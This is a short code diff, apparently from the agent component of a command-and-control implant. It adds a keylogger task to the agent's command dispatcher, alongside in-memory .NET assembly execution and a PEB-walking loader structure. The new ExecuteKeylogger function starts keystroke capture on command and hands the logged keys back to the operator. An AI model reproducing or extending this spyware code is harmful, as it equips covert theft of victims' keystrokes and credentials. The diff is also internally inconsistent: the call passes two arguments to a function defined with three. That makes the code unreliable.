@@ -94,6 +94,9 @@ void Agent::Start()
                 [this](const TaskRequest<CommandNetAsm>& netAsmRequest) -> Response {
                     return this->ExecuteNetAsm(netAsmRequest.taskID, netAsmRequest.data);
                 },
+                [this](const TaskRequest<CommandKeylogger>& keyloggerRequest) -> Response {
+                    return this->ExecuteKeylogger(keyloggerRequest.taskID, keyloggerRequest.taskCode);
+                },
                 [](const auto& unhandledRequest) -> Response {
                     return TaskResponse<TaskSuccess>{ };
                 }
@@ -310,6 +313,22 @@ Response Agent::ExecuteNetAsm(const int& taskID, const CommandNetAsm& request) {
     return CreateTaskResponse(taskID, NET_ASM, NO_CODE, SUCCESS, TaskSuccess{ buffer });
 }
 
+Response Agent::ExecuteKeylogger(const int& taskID, const int& code, const CommandKeylogger& request) {
+    KeyloggerResult result;
+
+    if (code == START_KEYLOGGER) {
+        result = keylogger.keylog_start();
+        
+    }
+    else if (code == STOP_KEYLOGGER) {
+        result = keylogger.get_keylog_data();
+    }
+    else {
+        return CreateTaskResponse(taskID, KEYLOGGER, NO_CODE, ERROR, TaskError{ -1, "Invalid keylogger command." });
+    }
+
+    return CreateTaskResponse(taskID, KEYLOGGER, code, result.status, result.result);
+}
 
 typedef struct _LDR_DATA_TABLE_ENTRY2 {
     LIST_ENTRY InMemoryOrderLinks;
